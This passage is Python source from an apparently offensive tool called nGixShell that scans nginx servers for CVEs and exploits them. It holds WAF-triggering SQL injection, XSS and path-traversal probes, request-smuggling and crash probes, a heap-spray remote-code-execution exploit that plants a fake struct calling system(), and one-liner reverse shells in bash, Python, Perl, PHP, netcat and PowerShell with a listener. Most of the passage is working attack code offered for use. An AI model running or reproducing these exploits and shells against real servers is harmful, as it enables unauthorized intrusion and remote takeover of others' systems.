               tls: bool = False, proxy: str = None) -> dict:
    """
    Probe the target for WAF signatures in response headers, cookies, and body.
    Returns {"detected": bool, "waf": str|None, "confidence": "high"|"low"|None,
             "evidence": [...], "status": int}.
    """
    result = {"detected": False, "waf": None, "confidence": None, "evidence": [], "status": 0}

    log(f"\n[*] WAF detection — {host}:{port}")
    log("─" * 70)

    try:
        # Send a clean request first
        status, headers, body = _http_get(host, port, "/", tls=tls, proxy=proxy, timeout=5)
        result["status"] = status

        # Also send a clearly malicious request to trigger WAF block page
        status_m, headers_m, body_m = _http_get(
            host, port,
            "/?id=1'%20OR%201%3D1--&cmd=<script>alert(1)</script>&path=../../../etc/passwd",
            tls=tls, proxy=proxy, timeout=5,
        )

        # Merge headers from both responses for wider signature coverage
        all_headers = {}
        all_headers.update(headers)
        all_headers.update(headers_m)
        body_text   = (body + body_m).decode("latin-1", errors="replace").lower()
        cookie_hdrs = headers.get("set-cookie", "") + " " + headers_m.get("set-cookie", "")

        matches = {}  # waf_name → [evidence strings]

        for waf_name, sigs in WAF_SIGNATURES.items():
            ev = []
            for h_name in sigs["headers"]:
                if h_name in all_headers:
                    ev.append(f"header '{h_name}'")
            for srv_kw in sigs["server"]:
                if srv_kw in all_headers.get("server", "").lower():
                    ev.append(f"server header '{all_headers['server']}'")
            for ck in sigs["cookies"]:
                if ck.lower() in cookie_hdrs.lower():
                    ev.append(f"cookie '{ck}'")
            for body_kw in sigs["body"]:
                if body_kw in body_text:
                    ev.append(f"body contains '{body_kw}'")
            if ev:
                matches[waf_name] = ev

        if matches:
            # pick the one with the most evidence
            best = max(matches, key=lambda k: len(matches[k]))
            result["detected"]   = True
            result["waf"]        = best
            result["confidence"] = "high" if len(matches[best]) >= 2 else "low"
            result["evidence"]   = matches[best]
            log(f"  [!] WAF DETECTED: {best}")
            log(f"  [!] Confidence  : {result['confidence']}")
            log(f"  [!] Evidence    : {', '.join(matches[best])}")
            if len(matches) > 1:
                others = [k for k in matches if k != best]
                log(f"  [~] Also matched: {', '.join(others)}")
        else:
            log("  [+] No WAF signatures detected")

        # Behaviour-based hints (block on malicious payload)
        if status_m in (403, 406, 429, 503) and status not in (403, 406, 429, 503):
            log(f"  [!] Malicious payload blocked ({status} → {status_m}) — WAF behaviour indicator")
            if not result["detected"]:
                result["detected"]   = True
                result["waf"]        = "Unknown WAF"
                result["confidence"] = "low"
                result["evidence"].append(f"blocks payload ({status}→{status_m})")

    except Exception as e:
        vlog(f"[v] detect_waf: {e}")
        log("  [!] Detection error — target may be unreachable")

    log("─" * 70)
    return result


# ─── Heap helpers ─────────────────────────────────────────────────────────────

def addr_is_safe(addr: int) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def get_candidates() -> list:
    return [(i, HEAP_BASE + off)
            for i, off in enumerate(PREREAD_HEAP_OFFSETS)
            if addr_is_safe(HEAP_BASE + off)]


def list_candidates() -> None:
    log(f"  {'#':<4} {'OFFSET':<12} {'ADDRESS':<18} SAFE")
    log("  " + "─" * 46)
    for i, off in enumerate(PREREAD_HEAP_OFFSETS):
        addr = HEAP_BASE + off
        log(f"  {i:<4} 0x{off:06x}     0x{addr:012x}     {'yes' if addr_is_safe(addr) else 'NO'}")


def make_body(cmd: str, data_addr: int, body_len: int) -> bytes:
    fake = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
    cb   = cmd.encode('utf-8') + b'\x00'
    pl   = fake + cb
    if len(pl) > body_len:
        log(f"[!] Command too long ({len(pl)} > {body_len})")
        sys.exit(1)
    return pl + b'\x41' * (body_len - len(pl))


# ─── CVE probes ───────────────────────────────────────────────────────────────

def probe_range_overflow(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET / HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Range": "bytes=0-,9223372036854775807"})) + b"\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400:        return False, "400 — patched"
        if status in (416, 200): return False, f"{status} — range ignored"
        return True, f"Status {status} — overflow Range indicator"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_smuggling(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s        = _connect(host, port, tls=tls, proxy=proxy, timeout=6)
        smuggled = b"GET /ngixshell-probe-2 HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"
        s.sendall(b"GET /ngixshell-probe-1 HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Content-Length": str(len(smuggled)), "Connection": "keep-alive"})) + b"\r\n" + smuggled)
        s.settimeout(3)
        raw = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                raw += chunk
                if raw.count(b"HTTP/") >= 2: break
        except socket.timeout:
            pass
        s.close()
        if raw.count(b"HTTP/") >= 2: return True, "Two HTTP responses — smuggling indicator"
        return False, "Single response"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_chunked(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"POST / HTTP/1.1\r\n" + _headers_to_wire(_build_headers(host, {
            "Transfer-Encoding": "chunked"})) + b"\r\n" + b"7fffffff\r\n")
        s.settimeout(3)
        try:   resp = s.recv(512)
        except socket.timeout: resp = b""
        s.close()
        if not resp: return True, "No response — possible crash"
        parts  = resp.split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status in (400, 411, 413): return False, f"{status} — patched"
        return None, f"Status {status} — inconclusive"
    except ConnectionResetError:
        return True, "Connection reset — possible crash"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_ipv6_bypass(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        baseline = _http_head(host, port, tls=tls, proxy=proxy, timeout=5).get("status_code", 0)
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET / HTTP/1.1\r\nHost: [::1]\r\nUser-Agent: " +
                  _user_agent.encode() + b"\r\nConnection: close\r\n\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if baseline in (403, 401) and status == 200:
            return True, f"IPv6 literal bypassed access ({baseline}→{status})"
        if status == 400: return False, "400 — patched"
        return None, f"Baseline {baseline} / IPv6 {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


def probe_uri_space(host, port, tls, proxy):
    try:
        if _rate_limiter: _rate_limiter.acquire()
        s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
        s.sendall(b"GET /ngixshell-test%20\x00.txt HTTP/1.0\r\n" +
                  _headers_to_wire(_build_headers(host)) + b"\r\n")
        s.settimeout(5)
        raw = b""
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(512)
            if not chunk: break
            raw += chunk
        s.close()
        parts  = raw.decode("latin-1", errors="replace").split()
        status = int(parts[1]) if len(parts) > 1 else 0
        if status == 400: return False, "400 — patched"
        if status in (200, 403, 404): return True, f"Status {status} — NUL processed (indicator)"
        return None, f"Status {status} — inconclusive"
    except Exception as e:
        return None, f"probe error: {e}"


PROBE_REGISTRY = {
    "probe_range_overflow": probe_range_overflow,
    "probe_smuggling":      probe_smuggling,
    "probe_chunked":        probe_chunked,
    "probe_ipv6_bypass":    probe_ipv6_bypass,
    "probe_uri_space":      probe_uri_space,
}

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}


def _run_probe_with_retry(fn, host, port, tls, proxy) -> tuple:
    last = (None, "no result")
    for n in range(max(1, _retry_count)):
        result, msg = fn(host, port, tls, proxy)
        if result is not None:
            return result, msg
        last = result, msg
        if n < _retry_count - 1:
            _sleep(0.5)
    return last


# ─── CVE scanner ──────────────────────────────────────────────────────────────

def list_cves() -> None:
    log(f"\nCVE Database — {len(CVE_DB)} entries")
    log("─" * 102)
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'AFFECTED RANGE':<24} "
        f"{'PROBE':<6} {'EXPLOIT':<8} FIXED IN")
    log("─" * 102)
    for cve_id, info in CVE_DB.items():
        amin = ".".join(str(x) for x in info["affected_min"])
        amax = ".".join(str(x) for x in info["affected_max"])
        log(f"  {cve_id:<18} {info['cvss']:<6} {info['severity']:<10} "
            f"{amin + ' – ' + amax:<24} "
            f"{'yes' if info['probe'] else 'no':<6} "
            f"{'YES' if info['exploit'] else 'no':<8} {info['fixed_in']}")
    log("─" * 102)


def cve_scan(host: str, port: int, tls: bool = False,
             proxy: str = None, target_cve: str = None,
             version: tuple = None) -> list:
    log(f"\n[*] CVE scan — {host}:{port}")
    log("─" * 96)

    if version is None:
        _, version = check_target(host, port, tls, proxy)

    log("")
    log(f"  {'CVE':<18} {'CVSS':<6} {'SEV':<10} {'STATUS':<20} DESCRIPTION")
    log("─" * 96)

    targets  = ({target_cve: CVE_DB[target_cve]} if target_cve else CVE_DB)
    findings = []
    detected_advisories = set()  # track which advisories already have a confirmed finding

    for cve_id, info in targets.items():
        if info.get("local_only"):
            status = "LOCAL-ONLY"
        elif version is None:
            status = "UNKNOWN"
        elif _version_in_range(version, info["affected_min"], info["affected_max"]):
            # If this CVE is a sibling of an already-confirmed finding, suppress it
            parent = info.get("same_advisory_as")
            if parent and parent in detected_advisories:
                status = "SAME-ADVISORY"
            else:
                probe_name = info.get("probe")
                if probe_name and probe_name in PROBE_REGISTRY:
                    result, msg = _run_probe_with_retry(
                        PROBE_REGISTRY[probe_name], host, port, tls, proxy)
                    vlog(f"[v] {cve_id}: {msg}")
                    status = ("VULNERABLE" if result is True
                              else "PROBE-CLEAN" if result is False
                              else "VERSION-MATCH")
                elif info.get("exploit"):
                    status = "EXPLOIT-AVAIL"
                else:
                    status = "VERSION-MATCH"
        else:
            status = "PATCHED"

        desc   = info["description"]
        short  = (desc[:57] + "...") if len(desc) > 60 else desc
        marker = ("[!]" if status in ("VULNERABLE", "EXPLOIT-AVAIL")
                  else "[-]" if status in ("PATCHED", "PROBE-CLEAN", "SAME-ADVISORY")
                  else "[?]")

        log(f"  {marker} {cve_id:<16} {info['cvss']:<6} {info['severity']:<10} {status:<20} {short}")

        if status in ("VULNERABLE", "EXPLOIT-AVAIL", "VERSION-MATCH"):
            findings.append((cve_id, info, status))
            detected_advisories.add(cve_id)
            if info.get("same_advisory_as"):
                detected_advisories.add(info["same_advisory_as"])

    log("─" * 96)

    by_sev = {}
    for _, info, _ in findings:
        by_sev[info["severity"]] = by_sev.get(info["severity"], 0) + 1
    sev_str = " | ".join(
        f"{s}: {c}" for s, c in sorted(by_sev.items(), key=lambda x: _SEV_ORDER.get(x[0], 99))
    )
    log(f"\n[+] Potential issues: {len(findings)}  ({sev_str or 'none'})")

    actionable = [(c, i, s) for c, i, s in findings if s in ("VULNERABLE", "EXPLOIT-AVAIL")]
    if actionable:
        log("\n[!] Actionable findings:")
        for cve_id, info, _ in actionable:
            log(f"    {cve_id} ({info['severity']}) — {info['description']}")
            log(f"      Fixed in : {info['fixed_in']}")
            log(f"      Ref      : {info.get('ref', 'N/A')}")
            if info.get("exploit"):
                log(f"      Exploit  : run with --cmd 'id' or --shell")
            if info.get("config_required"):
                log(f"      Requires : {', '.join(info['config_required'])}")

    return findings


# ─── Exploit ──────────────────────────────────────────────────────────────────

def wait_alive(host: str, port: int, timeout: int = 30,
               tls: bool = False, proxy: str = None) -> bool:
    req = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    for attempt_n in range(timeout):
        try:
            s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
            s.sendall(req)
            s.settimeout(5)
            data = s.recv(16)
            s.close()
            # Any HTTP response (even 4xx/5xx) means nginx is alive
            if data:
                return True
        except (ConnectionRefusedError, OSError):
            pass
        except Exception:
            pass
        if attempt_n < timeout - 1:
            _sleep(1)
    return False


def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
            rewrite_path="/api"):
    sprays = []
    # Incomplete-header heap spray: send request line + partial headers
    # without the terminating \r\n\r\n.  nginx stays in "reading headers"
    # state (up to client_header_timeout, default 60 s), holding the
    # large_client_header_buffer allocation live for the duration of the
    # trigger window.  This works regardless of location type or HTTP method
    # because nginx never reaches the handler — the request is never
    # dispatched.
    #
    # Previous technique sent Connection: close + a custom X-Delay header
    # that required a non-standard nginx module; nginx processed requests
    # immediately and freed all allocations before the trigger arrived,
    # making the spray completely ineffective.
    # The spray path must be handled by a location that reads the request
    # body before responding (e.g. proxy_pass, fastcgi_pass).  Static-file
    # locations (try_files) return 405 for POST before reading the body, so
    # the body allocation is never made and the spray has no effect.
    # The lab env/nginx.conf ships a /upload location backed by a dummy
    # proxy_pass for exactly this purpose.
    spray_path = "/upload"
    for i in range(n_spray):
        try:
            s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
            # Send complete headers + PARTIAL body (body_len bytes, but claim
            # body_len*4 via Content-Length).  nginx buffers what it receives
            # and then waits for the remaining bytes (up to client_body_timeout,
            # default 60 s), holding our fake-struct allocation live.
            hold_size = body_len * 4
            s.sendall(
                b"POST " + spray_path.encode() + b" HTTP/1.1\r\n"
                b"Host: " + host.encode() + b"\r\n"
                b"Content-Length: " + str(hold_size).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n" + body          # partial body (len=body_len < hold_size)
            )
            sprays.append(s)
        except Exception as e:
            vlog(f"[v] Spray {i}: {e}")
            break
        _sleep(0.005)
    _sleep(0.3)

    try:
        a = _connect(host, port, timeout=5, tls=tls, proxy=proxy); _sleep(0.02)
        v = _connect(host, port, timeout=5, tls=tls, proxy=proxy); _sleep(0.02)
    except Exception as e:
        vlog(f"[v] Trigger open failed: {e}")
        for s in sprays:
            try: s.close()
            except: pass
        return False

    path = rewrite_path.rstrip("/")
    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
    # Split-send the trigger: send request line + partial headers on 'a',
    # race with a concurrent GET on 'v', then complete 'a' headers.
    # Previously hardcoded to /api/ and used X-Delay:60 (custom module
    # dependency) — now uses --rewrite-path and standard Connection: close.
    a.sendall((f"GET {path}/{payload} HTTP/1.1\r\nHost: {host}\r\n").encode("latin-1"))
    _sleep(0.05)
    v.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
    _sleep(0.05)
    a.sendall(b"Connection: close\r\n\r\n")
    _sleep(0.2)
    v.close()
    _sleep(0.1)

    crashed = False
    try:
        a.sendall(b"X-Ping: 1\r\n")
        a.settimeout(0.2)
        if not a.recv(1): crashed = True
    except socket.timeout:
        try:
            ck = _connect(host, port, timeout=0.2, tls=tls, proxy=proxy)
            try:
                ck.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() +
                           b"\r\nConnection: close\r\n\r\n")
                crashed = not ck.recv(10)
            finally:
                ck.close()
        except Exception as e:
            vlog(f"[v] Check conn: {e}")
            crashed = True
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        vlog(f"[v] Trigger: {e}")
        crashed = True

    for s in sprays:
        try: s.close()
        except: pass
    try: a.close()
    except: pass
    vlog(f"[v] crashed={crashed}")
    return crashed


# ─── Subdomain scanner ────────────────────────────────────────────────────────

def _run_subfinder(domain: str, timeout: float = 60.0) -> list:
    """Run subfinder passively and return list of discovered subdomains."""
    if not shutil.which("subfinder"):
        return []
    try:
        result = subprocess.run(
            ["subfinder", "-d", domain, "-silent", "-all"],
            capture_output=True, text=True, timeout=timeout
        )
        subs = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if line and line.endswith(f".{domain}"):
                prefix = line[: -(len(domain) + 1)]
                if prefix:
                    subs.append(prefix)
        return subs
    except subprocess.TimeoutExpired:
        vlog("[v] subfinder timed out")
        return []
    except Exception as e:
        vlog(f"[v] subfinder error: {e}")
        return []


def _probe_subdomain(fqdn, port, tls, proxy, timeout):
    try:
        socket.getaddrinfo(fqdn, port, socket.AF_INET)
    except socket.gaierror:
        return None
    try:
        headers = _http_head(fqdn, port, tls=tls, proxy=proxy, timeout=timeout)
        server  = headers.get("server", "")
        version = _parse_version(server) if server else None
        vuln    = _version_in_range(version, VULN_MIN, VULN_MAX) if version else False
        return {"host": fqdn, "server": server or "(none)", "version": version, "vulnerable": vuln}
    except Exception as e:
        vlog(f"[v] {fqdn}: {e}")
        return None


def subdomain_scan(domain, wordlist, port=80, tls=False,
                   proxy=None, n_threads=20, timeout=5.0, use_subfinder=False):
    all_subs = list(wordlist)

    if use_subfinder:
        log(f"[*] Running subfinder against {domain} ...")
        sf_subs = _run_subfinder(domain, timeout=60.0)
        if sf_subs:
            log(f"[+] subfinder found {len(sf_subs)} subdomains")
            # merge without duplicates, preserving order
            existing = set(all_subs)
            for s in sf_subs:
                if s not in existing:
                    all_subs.append(s)
                    existing.add(s)
        else:
            log("[!] subfinder returned no results (not installed or no output)")

    log(f"[*] Subdomain scan: {domain} | {len(all_subs)} candidates | {n_threads} threads")
    log("─" * 68)
    log(f"  {'STATUS':<10} {'HOST':<42} SERVER")
    log("─" * 68)
    results = []
    with ThreadPoolExecutor(max_workers=n_threads) as ex:
        futures = {}
        for sub in all_subs:
            futures[ex.submit(_probe_subdomain, f"{sub}.{domain}", port, tls, proxy, timeout)] = sub
        for fut in as_completed(futures):
            r = fut.result()
            if r is None: continue
            tag = "[VULN]" if r["vulnerable"] else "[    ]"
            log(f"  {tag:<10} {r['host']:<42} {r['server']}")
            results.append(r)
    log("─" * 68)
    vuln = [r for r in results if r["vulnerable"]]
    log(f"[+] {len(results)} responded | {len(vuln)} potentially vulnerable")
    if vuln:
        log("\n[!] Potentially vulnerable:")
        for r in vuln: log(f"    {r['host']}  ({r['server']})")
    return results


# ─── Reverse shell ────────────────────────────────────────────────────────────

def _local_ip() -> str:
    """Return the best local IP to use as reverse-shell callback address."""
    # Prefer docker0 if present
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def _build_shell_payload(shell_type: str, ip: str, port: int) -> str:
    """Return a reverse-shell one-liner for the given type."""
    t = shell_type.lower()
    if t == "bash":
        return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    elif t == "python":
        return (f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    elif t == "perl":
        return (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");'")
    elif t == "php":
        return (f"php -r '$sock=fsockopen(\"{ip}\",{port});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    elif t in ("nc", "netcat"):
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    elif t in ("ps", "powershell"):
        return (f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                f"$x=[text.encoding]::ASCII.GetBytes($r2);$s.Write($x,0,$x.Length)}}\"")
    else:
        # default to python
        return _build_shell_payload("python", ip, port)


_PTY_UPGRADE = """\
  ── PTY upgrade (run inside the shell) ───────────────────────────────
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
  ─────────────────────────────────────────────────────────────────────"""


def start_shell_listener(port: int, upgrade: bool = False) -> threading.Thread:

    def _sock_listener():
        log(f"[*] Built-in listener — 0.0.0.0:{port}")
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        try:
            srv.settimeout(120)
            conn, addr = srv.accept()
            log(f"\n[+] Shell connected from {addr[0]}:{addr[1]}")
            log(_PTY_UPGRADE)

            if upgrade:
                _sleep(0.3)
                conn.sendall(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")
                _sleep(0.5)

            while True:
                r, _, _ = select.select([conn, sys.stdin], [], [], 1.0)
                if conn in r:
                    data = conn.recv(4096)
                    if not data:
                        log("[-] Shell closed.")
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                if sys.stdin in r:
                    line = sys.stdin.readline()
                    if not line:
                        break
                    conn.sendall(line.encode())
        except socket.timeout:
            log("[!] Listener timed out — no connection received")
        except Exception as e:
            vlog(f"[v] Listener: {e}")
        finally:
            try: srv.close()
            except: pass

    def _run():
        # try socat first (best interactive shell experience)
        if shutil.which("socat"):
            log(f"[*] socat listener — 0.0.0.0:{port}")
            log(_PTY_UPGRADE)
            try:
                subprocess.run(
                    ["socat", f"TCP-LISTEN:{port},reuseaddr,fork",
                     "EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"],
                    check=True,
                )
                return
            except Exception as e:
                vlog(f"[v] socat: {e}")
        # try nc
        if shutil.which("nc"):
            log(f"[*] nc listener — 0.0.0.0:{port}")
            log(_PTY_UPGRADE)
            try:
                # try ncat / nc with -lvnp (Linux)
                subprocess.run(["nc", "-lvnp", str(port)], check=True)
                return
            except Exception:
                try:
                    subprocess.run(["nc", "-l", str(port)], check=True)
                    return
                except Exception as e:
                    vlog(f"[v] nc: {e}")
        # pure-python fallback
        _sock_listener()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ─── Output helpers ───────────────────────────────────────────────────────────

_SEV_COLOR    = {"CRITICAL": "#ff4444", "HIGH": "#ff8800", "MEDIUM": "#ffcc00", "LOW": "#88cc00"}
_STATUS_COLOR = {
    "VULNERABLE": "#ff4444", "EXPLOIT-AVAIL": "#ff6600",
    "VERSION-MATCH": "#ffaa00", "UNKNOWN": "#888888",
    "PATCHED": "#44aa44", "PROBE-CLEAN": "#44aa44", "LOCAL-ONLY": "#6688aa",
}
_ISSUE_SEV_COLOR = {"CRITICAL": "#ff4444", "HIGH": "#ff8800",
                    "MEDIUM": "#ffcc00", "LOW": "#aaaaaa", "INFO": "#58a6ff"}


def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
                         elapsed=0.0, path="ngixshell_report.html"):
    ts   = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # CVE table rows
    cve_rows = ""
    for cve_id, info, status in findings:
        sc = _STATUS_COLOR.get(status, "#888")
        vc = _SEV_COLOR.get(info["severity"], "#888")
        cve_rows += (f"<tr><td><a href='{info.get('ref','')}' style='color:#58a6ff'>{cve_id}</a></td>"
                     f"<td style='color:{vc}'>{info['cvss']} {info['severity']}</td>"
                     f"<td style='color:{sc};font-weight:bold'>{status}</td>"
                     f"<td>{info['description']}</td>"
                     f"<td>{info['fixed_in']}</td></tr>\n")

    # Fingerprint section
    fp_html = ""
    if fingerprint:
        fp_html = "<h2>Fingerprint</h2><table>"
        for k, v in fingerprint.items():
            if k == "version_tuple": continue
            fp_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
        fp_html += "</table>"

    # Web audit sections
    web_html = ""
    if web_audit:
        # Header audit
        hdr_issues = web_audit.get("header_issues", [])
        if hdr_issues:
            web_html += "<h2>Header Security Audit</h2><table><tr><th>Header</th><th>Severity</th><th>Issue</th></tr>"
            for iss in hdr_issues:
                sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
                web_html += (f"<tr><td>{iss['header']}</td>"
                             f"<td style='color:{sc}'>{iss['severity']}</td>"
                             f"<td>{iss['issue']}</td></tr>")
            web_html += "</table>"

        # Paths found
        paths_found = web_audit.get("paths_found", [])
        if paths_found:
            web_html += "<h2>Discovered Paths</h2><table><tr><th>Status</th><th>Path</th><th>Note</th></tr>"
            for p in paths_found:
                sc = "#ff8800" if p["status"] == 200 else "#ffcc00"
                web_html += (f"<tr><td style='color:{sc}'>{p['status']}</td>"
                             f"<td>{p['path']}</td><td>{p['note']}</td></tr>")
            web_html += "</table>"

        # Virtual hosts
        vhosts_found = web_audit.get("vhosts_found", [])
        if vhosts_found:
            web_html += "<h2>Virtual Hosts Detected</h2><table><tr><th>VHost</th><th>Status</th><th>Note</th></tr>"
            for vh in vhosts_found:
                web_html += (f"<tr><td style='color:#58a6ff'>{vh['vhost']}</td>"
                             f"<td>{vh['status']}</td><td>{vh['note']}</td></tr>")
            web_html += "</table>"

        # TLS issues
        tls_result = web_audit.get("tls_result", {})
        tls_issues = tls_result.get("issues", [])
        if tls_issues:
            web_html += "<h2>TLS Issues</h2><table><tr><th>Severity</th><th>Issue</th></tr>"
            for iss in tls_issues:
                sc = _ISSUE_SEV_COLOR.get(iss["severity"], "#888")
                web_html += (f"<tr><td style='color:{sc}'>{iss['severity']}</td>"
                             f"<td>{iss['issue']}</td></tr>")
            web_html += "</table>"

        # stub_status
        stub = web_audit.get("stub_status", {})
        if stub:
            web_html += "<h2>nginx stub_status (EXPOSED)</h2><table>"
            for k, v in stub.items():
                web_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
            web_html += "</table>"

        # WAF detection
        waf = web_audit.get("waf")
        if waf:
            waf_color = "#ff4444" if waf.get("detected") else "#44aa44"
            waf_label = waf.get("waf") or "None detected"
            waf_conf  = waf.get("confidence", "")
            web_html += f"<h2>WAF Detection</h2><table>"
            web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Detected</td>"
                         f"<td style='color:{waf_color};font-weight:bold'>"
                         f"{'YES — ' + waf_label if waf.get('detected') else 'No WAF detected'}</td></tr>")
            if waf_conf:
                web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Confidence</td>"
                             f"<td>{waf_conf}</td></tr>")
            for ev in waf.get("evidence", []):
                web_html += (f"<tr><td style='color:#8b949e;padding-right:16px'>Evidence</td>"
                             f"<td>{ev}</td></tr>")
            web_html += "</table>"

    total_issues = len(findings) + len(web_audit.get("header_issues", []) if web_audit else [])

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>nGixShell — {host}:{port}</title>
<style>
body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:24px;margin:0}}
h1{{color:#00e676;letter-spacing:2px}}h2{{color:#58a6ff;margin-top:32px;border-bottom:1px solid #30363d;padding-bottom:6px}}
table{{border-collapse:collapse;width:100%;margin-top:12px}}
th{{background:#161b22;color:#8b949e;text-align:left;padding:8px 12px;border-bottom:1px solid #30363d}}
td{{padding:7px 12px;border-bottom:1px solid #21262d;vertical-align:top}}
tr:hover td{{background:#161b22}}.meta{{color:#8b949e;margin-bottom:24px;font-size:13px}}
</style></head><body>
<h1>nGixShell — Web Security Report</h1>
<div class="meta">
  Target: <strong>{host}:{port}</strong> &nbsp;|&nbsp;
  Generated: {ts} &nbsp;|&nbsp;
  Elapsed: {elapsed:.1f}s &nbsp;|&nbsp;
  Total issues: {total_issues}
</div>
{fp_html}
<h2>CVE Findings</h2>
<table><tr><th>CVE</th><th>CVSS / Severity</th><th>Status</th><th>Description</th><th>Fixed In</th></tr>
{cve_rows or '<tr><td colspan="5" style="color:#44aa44">No CVE issues detected.</td></tr>'}
</table>
{web_html}
</body></html>""")
    log(f"[+] HTML report: {path}")


def _build_json_output(host, port, findings, fingerprint=None,
                       web_audit=None, elapsed=0.0):
    out = {
        "tool":      "nGixShell",
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
        "target":    {"host": host, "port": port},
        "elapsed_s": round(elapsed, 2),
        "findings":  [],
    }
    if fingerprint:
        out["fingerprint"] = {k: v for k, v in fingerprint.items() if k != "version_tuple"}
    for cve_id, info, status in findings:
        out["findings"].append({
            "cve": cve_id, "cvss": info["cvss"], "severity": info["severity"],
            "status": status, "description": info["description"],
            "fixed_in": info["fixed_in"], "ref": info.get("ref", ""),
        })
    if web_audit:
        out["web_audit"] = {
            "header_issues":  web_audit.get("header_issues", []),
            "paths_found":    [{k: v for k, v in p.items() if k != "body_preview"}
                               for p in web_audit.get("paths_found", [])],
            "vhosts_found":   web_audit.get("vhosts_found", []),
            "tls_issues":     web_audit.get("tls_result", {}).get("issues", []),
            "stub_status":    web_audit.get("stub_status", {}),
            "waf":            web_audit.get("waf"),
        }
    return out


# ─── Entry point ──────────────────────────────────────────────────────────────

def main() -> int:
    global _verbose, _tmul, _log_fh, _user_agent, _extra_headers
    global _jitter_ms, _retry_count, _rate_limiter
    global _waf_bypass, _waf_spoof_ip

    parser = argparse.ArgumentParser(
        prog="ngixshell.py",
        description="nGixShell — nginx CVE scanner + RCE exploit (auto mode by default)",
